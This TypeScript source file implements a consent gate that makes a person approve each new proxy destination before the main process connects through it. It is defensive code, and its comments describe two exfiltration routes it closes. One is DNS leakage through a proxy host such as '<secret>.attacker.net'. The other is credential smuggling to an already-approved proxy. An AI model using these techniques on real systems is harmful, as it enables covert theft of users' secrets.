import { createHash } from 'node:crypto';
import { EgressError, planProxy } from './egress';

/**
 * **The renderer may not open an outbound channel on its own say-so.**
 *
 * `docs/THREAT_MODEL.md` claims, in the decisions table, that "a renderer
 * compromise cannot exfiltrate" — on the strength of the sandbox, no Node, and
 * `connect-src 'none'`. Those close every channel the renderer can open
 * *itself*. They do nothing about the one it can ask the main process to open
 * for it.
 *
 * Three IPC calls take a proxy address from the renderer — `accountSetProxy`,
 * `enrollmentBegin`, `transferAuthenticate` — and `planProxy` validates the
 * scheme, the port and the credentials but never the host. So a compromised
 * renderer sets a proxy of `http://<secret-encoded-as-a-label>.attacker.net`
 * and the main process resolves it, which hands the secret to whoever runs that
 * zone's nameserver. The connection does not need to succeed. DNS alone is the
 * channel, and everything the renderer can read — a Guard code, an account
 * name, the vault's shape — fits in a hostname.
 *
 * That is the exfiltration route the table says does not exist, and it defeats
 * the whole point of keeping long-term secrets out of the renderer: what the
 * renderer *can* see becomes sendable.
 *
 * **So a new destination needs a person.** Consent is asked for by the main
 * process, in an OS dialog the renderer cannot draw, dismiss or read, and it
 * names the host. It is asked once per destination, not once per request:
 * routing an account through a proxy it already uses prompts nobody, and the
 * addresses already in the vault are seeded as approved on unlock, because the
 * user established those already.
 *
 * It is not a complete answer — a person can be talked into approving a
 * plausible-looking hostname — but it converts a silent, unlimited channel into
 * one that is visible, consented, and rate-limited by human attention.
 */

/**
 * What an approval is *for*: the scheme, the endpoint, and whether the
 * credentials are the ones that were approved.
 *
 * **`host:port` alone was not the destination, and that was a real hole.** The
 * first version of this reasoned that credentials reach the proxy operator and
 * never travel as a name, so rotating a password was not a new destination and
 * asking again would only train people to click through. The first half is
 * true and the conclusion does not follow: a compromised renderer does not need
 * a *new* destination. It saves the same approved endpoint with attacker-chosen
 * username and password, skips the dialog entirely because the endpoint matches,
 * and the transport then sends those strings to the proxy on the next
 * authentication. The credentials are the payload, and the approved operator is
 * the recipient — the same exfiltration channel the gate was built to close,
 * reached through the one field the gate ignored.
 *
 * Hashed rather than stored: this decides whether two attempts agree, and it
 * never needs to say what they agree *on*. A rotated password therefore
 * re-prompts, naming the host and never the secret.
 *
 * The scheme is in the key for a plainer reason — `http://` and `socks5://` to
 * one address are two different protocols to two different listeners, and the
 * user agreed to one of them.
 */
function destinationKey(proxyUrl: string, endpoint: string): string {
	let scheme: string;
	let credentials: string;
	try {
		const url = new URL(proxyUrl);
		scheme = url.protocol;
		credentials = `${url.username}:${url.password}`;
	} catch {
		// `planProxy` has already accepted this, so it parses. Keyed conservatively
		// if that ever stops being true: an unreadable address matches nothing
		// previously approved, which asks rather than assumes.
		return `unparsed:${proxyUrl}`;
	}
	// Truncated because this is an equality check between two strings this
	// process produced, not a signature over anything.
	const fingerprint =
		credentials === ':'
			? 'none'
			: createHash('sha256').update(credentials).digest('hex').slice(0, 32);
	return `${scheme}//${endpoint}#${fingerprint}`;
}

/** Why a destination is being introduced, which changes what the dialog says. */
export type ProxyConsentReason = 'route' | 'signIn';

export interface ProxyConsentRequest {
	/** `host:port`, the thing actually connected to. */
	endpoint: string;
	/** The scheme and host with any credentials starred out, for display. */
	redacted: string;
	/** Whose traffic this is about, when there is an account to name. */
	accountName?: string;
	reason: ProxyConsentReason;
}

/** Put the question to the user. Resolves true only for a deliberate yes. */
export type ProxyConsentAsk = (request: ProxyConsentRequest) => Promise<boolean>;

/**
 * Refused destinations are not remembered.
 *
 * A no is about this attempt. Caching it would turn one misclick into a proxy
 * the user can never set without restarting, and the whole point is that the
 * decision is cheap to make again.
 */
export class ProxyConsent {
	private readonly approved = new Set<string>();
	private readonly ask: ProxyConsentAsk;

	/**
	 * Bumped by {@link clear}, so a dialog already on screen cannot outlive it.
	 *
	 * **Clearing the set was not enough.** `clear()` drops approvals that exist;
	 * it said nothing about the question being asked *right now*, and that
	 * question is an OS dialog a person may leave sitting for as long as they
	 * like. Measured: hold the dialog, lock the vault — which calls `clear()` —
	 * then approve. The approval was recorded and enrolment carried on with the
	 * password, sending it through an endpoint approved after the vault had
	 * closed. Transfer takes the same path and carries a Steam Guard code too.
	 *
	 * A generation captured before the await and compared after it is what turns
	 * "forget what was approved" into "and abandon what is being asked".
	 */
	private generation = 0;

	constructor(options: { ask?: ProxyConsentAsk } = {}) {
		// Refusing by default matters: a wiring mistake that left this unset would
		// otherwise approve everything silently, which is the state being fixed.
		this.ask = options.ask ?? ((): Promise<boolean> => Promise.resolve(false));
	}

	/**
	 * Treat these addresses as already the user's own routing.
	 *
	 * Called on unlock with what the vault holds. Without it every stored proxy
	 * would ask again after each lock, which is a prompt with no decision in it —
	 * and a prompt with no decision in it is how people learn to click Allow.
	 *
	 * Unparseable entries are skipped rather than thrown on: this runs on unlock,
	 * and a vault written by an older build must still open.
	 */
	seed(proxyUrls: Iterable<string | undefined>): void {
		for (const proxyUrl of proxyUrls) {
			if (proxyUrl === undefined || proxyUrl === '') {
				continue;
			}
			try {
				this.approved.add(destinationKey(proxyUrl, planProxy(proxyUrl).endpoint));
			} catch {
				// Not a usable address, so nothing will ever connect to it.
			}
		}
	}

	/**
	 * Already approved, so no dialog is raised for it.
	 *
	 * Takes the whole address rather than an endpoint: an approval is bound to
	 * the scheme and the credentials as well, and a caller that could ask about
	 * a bare `host:port` would be asking a question this class deliberately
	 * stopped answering.
	 */
	has(proxyUrl: string): boolean {
		try {
			return this.approved.has(destinationKey(proxyUrl, planProxy(proxyUrl).endpoint));
		} catch {
			return false;
		}
	}

	/**
	 * Ask, unless this destination is already approved.
	 *
	 * @throws EgressError when the user says no, worded so the renderer can show
	 * it as an ordinary refusal — there is nothing secret in "you declined".
	 */
	async require(
		proxyUrl: string,
		context: { accountName?: string; reason: ProxyConsentReason }
	): Promise<void> {
		// Throws for an unusable address before anything is asked, so the dialog
		// never quotes a host that could not be connected to anyway.
		const plan = planProxy(proxyUrl);
		const key = destinationKey(proxyUrl, plan.endpoint);
		if (this.approved.has(key)) {
			return;
		}

		const asked = this.generation;
		const allowed = await this.ask({
			endpoint: plan.endpoint,
			redacted: plan.redacted,
			...(context.accountName === undefined ? {} : { accountName: context.accountName }),
			reason: context.reason
		});
		/*
		 * **The answer is only good for the session it was asked in.**
		 *
		 * A dialog can sit on screen indefinitely, and the vault locks on its own
		 * schedule. An approval given after that lock is an approval nobody
		 * present agreed to — and the caller is about to send a password through
		 * the endpoint it names.
		 */
		if (asked !== this.generation) {
			throw new EgressError(
				`the vault locked while ${plan.endpoint} was waiting to be approved, so it was not used`
			);
		}
		if (!allowed) {
			throw new EgressError(
				`sending this account's traffic through ${plan.endpoint} was not approved`
			);
		}
		this.approved.add(key);
	}

	/**
	 * Forget every approval. Called when the vault locks.
	 *
	 * The approvals describe what the person at the machine agreed to while they
	 * were there. Locking is the statement that they may not be, and `seed` puts
	 * back the ones the vault itself vouches for on the next unlock — so what is
	 * actually dropped is consent for a destination that was never stored, which
	 * is precisely the shape of an exfiltration attempt.
	 */
	clear(): void {
		this.approved.clear();
		// And disown any dialog still on screen. See `generation`.
		this.generation += 1;
	}
}
